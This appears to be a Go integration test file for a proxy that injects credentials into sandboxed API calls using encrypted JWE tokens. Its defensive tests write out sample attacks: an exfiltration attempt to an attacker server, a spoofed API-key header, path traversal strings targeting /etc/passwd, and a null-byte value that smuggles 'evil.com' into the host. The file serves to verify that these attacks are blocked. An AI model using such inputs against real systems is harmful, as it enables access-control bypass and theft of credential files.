package proxy

import (
	"bytes"
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/stainless-api/stainless-proxy/internal/jwe"
	"github.com/stainless-api/stainless-proxy/internal/revocation"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// Helper to build a full proxy + encryptor + deny list for integration tests
type testHarness struct {
	proxy    *Proxy
	enc      *jwe.Encryptor
	denyList *revocation.DenyList
	kid      string
	key      *ecdsa.PrivateKey
}

func newTestHarness(t *testing.T) *testHarness {
	t.Helper()
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	require.NoError(t, err)

	kid := "integration-key"
	enc := jwe.NewEncryptor(&key.PublicKey, kid)
	dec := jwe.NewMultiKeyDecryptor([]jwe.KeyEntry{{KID: kid, PrivateKey: key}})
	dl := revocation.NewDenyList()
	p := New(dec, dl)

	return &testHarness{proxy: p, enc: enc, denyList: dl, kid: kid, key: key}
}

func (h *testHarness) mint(t *testing.T, hosts []string, creds []jwe.Credential, ttl time.Duration) string {
	t.Helper()
	payload := jwe.Payload{
		Exp:          time.Now().Add(ttl).Unix(),
		AllowedHosts: hosts,
		Credentials:  creds,
	}
	token, err := h.enc.Encrypt(payload)
	require.NoError(t, err)
	return token
}

// =============================================================================
// Scenario 1: Datadog-style API with two credential headers
// Verifies that multiple credentials are injected correctly and that the
// original Authorization header (carrying the JWE) is stripped.
// =============================================================================

func TestScenario_DatadogMultiHeaderAuth(t *testing.T) {
	h := newTestHarness(t)

	var receivedHeaders http.Header
	backend := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		receivedHeaders = r.Header.Clone()
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(`{"data":[]}`))
	}))
	defer backend.Close()
	h.proxy.client = backend.Client()

	backendHost := strings.TrimPrefix(backend.URL, "https://")
	token := h.mint(t, []string{backendHost}, []jwe.Credential{
		{Header: "DD-API-KEY", Value: "datadog-api-key-12345"},
		{Header: "DD-APPLICATION-KEY", Value: "datadog-app-key-67890"},
	}, time.Hour)

	req := httptest.NewRequest("GET", "/https/"+backendHost+"/api/v2/metrics?from=now-1h", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Accept", "application/json")
	w := httptest.NewRecorder()

	h.proxy.ServeHTTP(w, req)

	assert.Equal(t, http.StatusOK, w.Code)
	assert.Equal(t, "datadog-api-key-12345", receivedHeaders.Get("DD-API-KEY"))
	assert.Equal(t, "datadog-app-key-67890", receivedHeaders.Get("DD-APPLICATION-KEY"))
	// JWE bearer token must NOT reach the backend
	assert.NotContains(t, receivedHeaders.Get("Authorization"), "eyJ")
	// Non-sensitive headers should be forwarded
	assert.Equal(t, "application/json", receivedHeaders.Get("Accept"))
}

// =============================================================================
// Scenario 2: Credential exfiltration attempt
// A compromised sandbox tries to redirect the proxy to an attacker-controlled
// server. Host locking must block this.
// =============================================================================

func TestScenario_ExfiltrationAttempt(t *testing.T) {
	h := newTestHarness(t)

	attacker := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		t.Fatal("attacker server should never be reached")
	}))
	defer attacker.Close()

	// Token is only valid for the legitimate API
	token := h.mint(t, []string{"api.datadoghq.com"}, []jwe.Credential{
		{Header: "DD-API-KEY", Value: "secret"},
	}, time.Hour)

	attackerHost := strings.TrimPrefix(attacker.URL, "https://")

	req := httptest.NewRequest("GET", "/https/"+attackerHost+"/exfiltrate", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()

	h.proxy.ServeHTTP(w, req)

	assert.Equal(t, http.StatusForbidden, w.Code)
	assert.Contains(t, w.Body.String(), "host not allowed")
}

// =============================================================================
// Scenario 3: Token replay after revocation
// A JWE is minted, used successfully, then revoked. Subsequent use must fail.
// =============================================================================

func TestScenario_TokenReplayAfterRevocation(t *testing.T) {
	h := newTestHarness(t)

	var callCount atomic.Int32
	backend := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		callCount.Add(1)
		w.WriteHeader(http.StatusOK)
	}))
	defer backend.Close()
	h.proxy.client = backend.Client()

	backendHost := strings.TrimPrefix(backend.URL, "https://")
	token := h.mint(t, []string{backendHost}, []jwe.Credential{
		{Header: "Authorization", Value: "Bearer real-token"},
	}, time.Hour)

	// First request: should succeed
	req := httptest.NewRequest("GET", "/https/"+backendHost+"/api/data", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	h.proxy.ServeHTTP(w, req)
	assert.Equal(t, http.StatusOK, w.Code)
	assert.Equal(t, int32(1), callCount.Load())

	// Revoke the token
	hash := sha256.Sum256([]byte(token))
	h.denyList.Add(hex.EncodeToString(hash[:]), time.Now().Add(time.Hour))

	// Second request: should be rejected
	req = httptest.NewRequest("GET", "/https/"+backendHost+"/api/data", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w = httptest.NewRecorder()
	h.proxy.ServeHTTP(w, req)
	assert.Equal(t, http.StatusForbidden, w.Code)
	// Backend should NOT have been called again
	assert.Equal(t, int32(1), callCount.Load())
}

// =============================================================================
// Scenario 4: Key rotation — old JWE still works after new key is added
// Simulates a key rotation where the proxy has both old and new keys.
// JWEs minted with the old key must still decrypt.
// =============================================================================

func TestScenario_KeyRotation(t *testing.T) {
	oldKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	require.NoError(t, err)
	newKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	require.NoError(t, err)

	// Decryptor knows both keys
	dec := jwe.NewMultiKeyDecryptor([]jwe.KeyEntry{
		{KID: "old-key", PrivateKey: oldKey},
		{KID: "new-key", PrivateKey: newKey},
	})
	dl := revocation.NewDenyList()
	p := New(dec, dl)

	backend := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte("ok:" + r.Header.Get("X-Api-Key")))
	}))
	defer backend.Close()
	p.client = backend.Client()
	backendHost := strings.TrimPrefix(backend.URL, "https://")

	// Mint with old key
	oldEnc := jwe.NewEncryptor(&oldKey.PublicKey, "old-key")
	oldPayload := jwe.Payload{
		Exp:          time.Now().Add(time.Hour).Unix(),
		AllowedHosts: []string{backendHost},
		Credentials:  []jwe.Credential{{Header: "X-Api-Key", Value: "old-secret"}},
	}
	oldToken, err := oldEnc.Encrypt(oldPayload)
	require.NoError(t, err)

	// Mint with new key
	newEnc := jwe.NewEncryptor(&newKey.PublicKey, "new-key")
	newPayload := jwe.Payload{
		Exp:          time.Now().Add(time.Hour).Unix(),
		AllowedHosts: []string{backendHost},
		Credentials:  []jwe.Credential{{Header: "X-Api-Key", Value: "new-secret"}},
	}
	newToken, err := newEnc.Encrypt(newPayload)
	require.NoError(t, err)

	// Both tokens should work
	for _, tc := range []struct {
		name  string
		token string
		want  string
	}{
		{"old key token", oldToken, "ok:old-secret"},
		{"new key token", newToken, "ok:new-secret"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			req := httptest.NewRequest("GET", "/https/"+backendHost+"/test", nil)
			req.Header.Set("Authorization", "Bearer "+tc.token)
			w := httptest.NewRecorder()
			p.ServeHTTP(w, req)
			assert.Equal(t, http.StatusOK, w.Code)
			assert.Equal(t, tc.want, w.Body.String())
		})
	}
}

// =============================================================================
// Scenario 5: Concurrent requests with different credentials
// Multiple sandbox sessions using different JWEs concurrently.
// Each must get their own credentials injected — no cross-contamination.
// =============================================================================

func TestScenario_ConcurrentIsolation(t *testing.T) {
	h := newTestHarness(t)

	backend := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Echo the injected credential back
		w.Write([]byte(r.Header.Get("X-User-Token")))
	}))
	defer backend.Close()
	h.proxy.client = backend.Client()
	backendHost := strings.TrimPrefix(backend.URL, "https://")

	const numUsers = 50
	var wg sync.WaitGroup
	errors := make([]string, numUsers)

	for i := range numUsers {
		wg.Add(1)
		go func(userID int) {
			defer wg.Done()

			expectedToken := fmt.Sprintf("user-%d-token", userID)
			token := h.mint(t, []string{backendHost}, []jwe.Credential{
				{Header: "X-User-Token", Value: expectedToken},
			}, time.Hour)

			req := httptest.NewRequest("GET", "/https/"+backendHost+"/api/me", nil)
			req.Header.Set("Authorization", "Bearer "+token)
			w := httptest.NewRecorder()
			h.proxy.ServeHTTP(w, req)

			if w.Code != http.StatusOK {
				errors[userID] = fmt.Sprintf("user %d: status %d", userID, w.Code)
				return
			}
			if w.Body.String() != expectedToken {
				errors[userID] = fmt.Sprintf("user %d: got %q, want %q", userID, w.Body.String(), expectedToken)
			}
		}(i)
	}

	wg.Wait()
	for _, e := range errors {
		if e != "" {
			t.Error(e)
		}
	}
}

// =============================================================================
// Scenario 6: POST with large JSON body (code execution payload)
// Simulates the actual use case: agent sends a script to execute.
// The proxy must forward the body untouched.
// =============================================================================

func TestScenario_LargePostBody(t *testing.T) {
	h := newTestHarness(t)

	var receivedBody []byte
	backend := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var err error
		receivedBody, err = io.ReadAll(r.Body)
		if err != nil {
			t.Fatal(err)
		}
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte(`{"result":"success"}`))
	}))
	defer backend.Close()
	h.proxy.client = backend.Client()
	backendHost := strings.TrimPrefix(backend.URL, "https://")

	// Simulate a large TypeScript script
	script := strings.Repeat("console.log('line');\n", 10000)
	body, _ := json.Marshal(map[string]string{"script": script})

	token := h.mint(t, []string{backendHost}, []jwe.Credential{
		{Header: "Authorization", Value: "Bearer api-key-for-execution"},
	}, time.Hour)

	req := httptest.NewRequest("POST", "/https/"+backendHost+"/ai/tools/code", bytes.NewReader(body))
	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	h.proxy.ServeHTTP(w, req)

	assert.Equal(t, http.StatusOK, w.Code)
	assert.Equal(t, body, receivedBody)
}

// =============================================================================
// Scenario 7: SSE streaming response
// The target API returns a streaming SSE response. The proxy must flush
// incrementally, not buffer the entire response.
// =============================================================================

func TestScenario_SSEStreaming(t *testing.T) {
	h := newTestHarness(t)

	backend := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/event-stream")
		w.Header().Set("Cache-Control", "no-cache")
		w.WriteHeader(http.StatusOK)

		flusher, ok := w.(http.Flusher)
		if !ok {
			t.Fatal("expected flusher")
		}

		for i := range 5 {
			fmt.Fprintf(w, "data: event %d\n\n", i)
			flusher.Flush()
		}
	}))
	defer backend.Close()
	h.proxy.client = backend.Client()
	backendHost := strings.TrimPrefix(backend.URL, "https://")

	token := h.mint(t, []string{backendHost}, []jwe.Credential{
		{Header: "Authorization", Value: "Bearer stream-key"},
	}, time.Hour)

	req := httptest.NewRequest("GET", "/https/"+backendHost+"/events", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()

	h.proxy.ServeHTTP(w, req)

	assert.Equal(t, http.StatusOK, w.Code)
	assert.Equal(t, "text/event-stream", w.Header().Get("Content-Type"))
	body := w.Body.String()
	for i := range 5 {
		assert.Contains(t, body, fmt.Sprintf("data: event %d", i))
	}
}

// =============================================================================
// Scenario 8: Token expiry mid-session
// Mint a token with very short TTL, wait for it to expire, verify rejection.
// =============================================================================

func TestScenario_TokenExpiryMidSession(t *testing.T) {
	h := newTestHarness(t)

	backend := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	defer backend.Close()
	h.proxy.client = backend.Client()
	backendHost := strings.TrimPrefix(backend.URL, "https://")

	// Token expires in 1 second
	token := h.mint(t, []string{backendHost}, []jwe.Credential{
		{Header: "Authorization", Value: "Bearer short-lived"},
	}, 1*time.Second)

	// Should work immediately
	req := httptest.NewRequest("GET", "/https/"+backendHost+"/api", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	h.proxy.ServeHTTP(w, req)
	assert.Equal(t, http.StatusOK, w.Code)

	// Wait for expiry
	time.Sleep(2 * time.Second)

	// Should now fail
	req = httptest.NewRequest("GET", "/https/"+backendHost+"/api", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w = httptest.NewRecorder()
	h.proxy.ServeHTTP(w, req)
	assert.Equal(t, http.StatusUnauthorized, w.Code)
}

// =============================================================================
// Scenario 9: Wildcard host matching edge cases
// Verify that wildcard patterns work correctly and don't allow bypasses.
// =============================================================================

func TestScenario_WildcardHostEdgeCases(t *testing.T) {
	h := newTestHarness(t)

	backend := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	defer backend.Close()
	h.proxy.client = backend.Client()
	backendHost := strings.TrimPrefix(backend.URL, "https://")

	tests := []struct {
		name     string
		hosts    []string
		target   string
		wantCode int
	}{
		{
			name:     "wildcard allows subdomain",
			hosts:    []string{"*.nonexistent.test"},
			target:   "/https/sub.nonexistent.test/v1/data",
			wantCode: http.StatusBadGateway, // host matches wildcard, but no real backend → 502
		},
		{
			name:     "wildcard does not match bare domain",
			hosts:    []string{"*.datadoghq.com"},
			target:   "/https/datadoghq.com/v1/data",
			wantCode: http.StatusForbidden,
		},
		{
			name:     "exact match on backend host",
			hosts:    []string{backendHost},
			target:   "/https/" + backendHost + "/test",
			wantCode: http.StatusOK,
		},
		{
			name:     "multiple patterns, one matches",
			hosts:    []string{"other.com", backendHost},
			target:   "/https/" + backendHost + "/test",
			wantCode: http.StatusOK,
		},
		{
			name:     "no pattern matches",
			hosts:    []string{"totally-different.com"},
			target:   "/https/" + backendHost + "/test",
			wantCode: http.StatusForbidden,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			token := h.mint(t, tc.hosts, []jwe.Credential{
				{Header: "X-Key", Value: "val"},
			}, time.Hour)

			req := httptest.NewRequest("GET", tc.target, nil)
			req.Header.Set("Authorization", "Bearer "+token)
			w := httptest.NewRecorder()
			h.proxy.ServeHTTP(w, req)
			assert.Equal(t, tc.wantCode, w.Code)
		})
	}
}

// =============================================================================
// Scenario 10: Request cancellation / context timeout
// Verify that the proxy respects context cancellation (e.g., client disconnect).
// =============================================================================

func TestScenario_ContextCancellation(t *testing.T) {
	h := newTestHarness(t)

	backendStarted := make(chan struct{})
	backend := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		close(backendStarted)
		// Simulate a slow backend
		select {
		case <-r.Context().Done():
			// Client cancelled — this is what we expect
			return
		case <-time.After(30 * time.Second):
			w.WriteHeader(http.StatusOK)
		}
	}))
	defer backend.Close()
	h.proxy.client = backend.Client()
	backendHost := strings.TrimPrefix(backend.URL, "https://")

	token := h.mint(t, []string{backendHost}, []jwe.Credential{
		{Header: "Authorization", Value: "Bearer x"},
	}, time.Hour)

	ctx, cancel := context.WithCancel(context.Background())
	req := httptest.NewRequest("GET", "/https/"+backendHost+"/slow", nil)
	req = req.WithContext(ctx)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()

	done := make(chan struct{})
	go func() {
		h.proxy.ServeHTTP(w, req)
		close(done)
	}()

	<-backendStarted
	cancel()

	select {
	case <-done:
		// Proxy returned after cancellation — good
	case <-time.After(5 * time.Second):
		t.Fatal("proxy did not return after context cancellation")
	}
}

// =============================================================================
// Scenario 11: Query parameters preserved
// Verify query strings pass through correctly to the target.
// =============================================================================

func TestScenario_QueryParametersPreserved(t *testing.T) {
	h := newTestHarness(t)

	var receivedQuery string
	backend := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		receivedQuery = r.URL.RawQuery
		w.WriteHeader(http.StatusOK)
	}))
	defer backend.Close()
	h.proxy.client = backend.Client()
	backendHost := strings.TrimPrefix(backend.URL, "https://")

	token := h.mint(t, []string{backendHost}, []jwe.Credential{
		{Header: "X-Key", Value: "val"},
	}, time.Hour)

	req := httptest.NewRequest("GET", "/https/"+backendHost+"/api/search?q=test%20query&limit=10&offset=0", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()

	h.proxy.ServeHTTP(w, req)

	assert.Equal(t, http.StatusOK, w.Code)
	assert.Equal(t, "q=test%20query&limit=10&offset=0", receivedQuery)
}

// =============================================================================
// Scenario 12: Backend returns error status codes
// Proxy must faithfully forward 4xx/5xx from the target API.
// =============================================================================

func TestScenario_BackendErrorPassthrough(t *testing.T) {
	h := newTestHarness(t)

	backend := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/not-found":
			w.WriteHeader(http.StatusNotFound)
			w.Write([]byte(`{"error":"not found"}`))
		case "/rate-limited":
			w.Header().Set("Retry-After", "30")
			w.WriteHeader(http.StatusTooManyRequests)
			w.Write([]byte(`{"error":"rate limited"}`))
		case "/server-error":
			w.WriteHeader(http.StatusInternalServerError)
			w.Write([]byte(`{"error":"internal"}`))
		}
	}))
	defer backend.Close()
	h.proxy.client = backend.Client()
	backendHost := strings.TrimPrefix(backend.URL, "https://")

	token := h.mint(t, []string{backendHost}, []jwe.Credential{
		{Header: "Authorization", Value: "Bearer x"},
	}, time.Hour)

	tests := []struct {
		path     string
		wantCode int
		wantBody string
	}{
		{"/not-found", 404, `{"error":"not found"}`},
		{"/rate-limited", 429, `{"error":"rate limited"}`},
		{"/server-error", 500, `{"error":"internal"}`},
	}

	for _, tc := range tests {
		t.Run(tc.path, func(t *testing.T) {
			req := httptest.NewRequest("GET", "/https/"+backendHost+tc.path, nil)
			req.Header.Set("Authorization", "Bearer "+token)
			w := httptest.NewRecorder()
			h.proxy.ServeHTTP(w, req)

			assert.Equal(t, tc.wantCode, w.Code)
			assert.Equal(t, tc.wantBody, w.Body.String())
		})
	}
}

// =============================================================================
// Scenario 13: Credential override — JWE credential overwrites existing header
// If the sandbox code sets a header that the JWE also injects, the JWE
// credential MUST win (otherwise sandbox code could inject its own auth).
// =============================================================================

func TestScenario_CredentialOverridesExistingHeader(t *testing.T) {
	h := newTestHarness(t)

	var received string
	backend := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		received = r.Header.Get("X-Api-Key")
		w.WriteHeader(http.StatusOK)
	}))
	defer backend.Close()
	h.proxy.client = backend.Client()
	backendHost := strings.TrimPrefix(backend.URL, "https://")

	token := h.mint(t, []string{backendHost}, []jwe.Credential{
		{Header: "X-Api-Key", Value: "real-secret-from-jwe"},
	}, time.Hour)

	req := httptest.NewRequest("GET", "/https/"+backendHost+"/api", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	// Sandbox tries to set its own X-Api-Key
	req.Header.Set("X-Api-Key", "attacker-injected-value")
	w := httptest.NewRecorder()

	h.proxy.ServeHTTP(w, req)

	assert.Equal(t, http.StatusOK, w.Code)
	assert.Equal(t, "real-secret-from-jwe", received)
}

// =============================================================================
// Scenario 14: Path traversal attempt
// Sandbox tries to manipulate the path to access unintended APIs.
// =============================================================================

func TestScenario_PathTraversal(t *testing.T) {
	h := newTestHarness(t)

	token := h.mint(t, []string{"api.safe.com"}, []jwe.Credential{
		{Header: "Authorization", Value: "Bearer x"},
	}, time.Hour)

	paths := []string{
		"/https/api.safe.com/../../../etc/passwd",
		"/https/api.safe.com/..%2F..%2Fetc%2Fpasswd",
		"/https/evil.com%00api.safe.com/data",
	}

	for _, path := range paths {
		t.Run(path, func(t *testing.T) {
			req := httptest.NewRequest("GET", path, nil)
			req.Header.Set("Authorization", "Bearer "+token)
			w := httptest.NewRecorder()
			h.proxy.ServeHTTP(w, req)

			// Either blocked by host matching or forwarded with the path as-is
			// (the target server handles path traversal — we just ensure the
			// host lock isn't bypassed)
			assert.NotEqual(t, http.StatusOK, w.Code)
		})
	}
}
